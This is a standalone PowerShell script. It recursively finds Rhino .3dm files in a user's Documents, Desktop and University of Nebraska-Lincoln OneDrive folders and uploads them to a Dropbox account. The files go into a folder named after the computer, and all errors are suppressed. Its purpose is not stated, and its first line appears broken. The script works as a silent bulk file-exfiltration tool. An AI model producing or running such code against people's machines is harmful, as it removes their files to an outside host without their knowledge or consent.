$accessToken = $db
$localFolders = @(
    "$env:USERPROFILE\Documents",
    "$env:USERPROFILE\Desktop",
    "$env:USERPROFILE\OneDrive - University of Nebraska-Lincoln"
)

$computerName = $env:COMPUTERNAME
$dropboxFolderPath = "/$computerName"
$dropboxUploadUrl = "https://content.dropboxapi.com/2/files/upload"

# Create computer folder in Dropbox
$headers = @{
    "Authorization" = "Bearer $accessToken"
    "Content-Type" = "application/json"
}
$body = @{
    "path" = $dropboxFolderPath
    "autorename" = $true
} | ConvertTo-Json
Invoke-RestMethod -Uri "https://api.dropboxapi.com/2/files/create_folder_v2" -Method Post -Headers $headers -Body $body | Out-Null

# Upload files
$headers["Content-Type"] = "application/octet-stream"
foreach ($folder in $localFolders) {
    Get-ChildItem -Path $folder -Filter "*.3dm" -Recurse -File -ErrorAction SilentlyContinue | ForEach-Object {
        try {
            $fileName = $_.Name
            $dropboxPath = "$dropboxFolderPath/$fileName"
            $fileBytes = [System.IO.File]::ReadAllBytes($_.FullName)
            
            $headers["Dropbox-API-Arg"] = @{
                "path" = $dropboxPath
                "mode" = "add"
                "autorename" = $true
                "mute" = $false
            } | ConvertTo-Json -Compress
            
            Invoke-RestMethod -Uri $dropboxUploadUrl -Method Post -Headers $headers -Body $fileBytes
        }
        catch {
            # Silent error handling
        }
    }
}
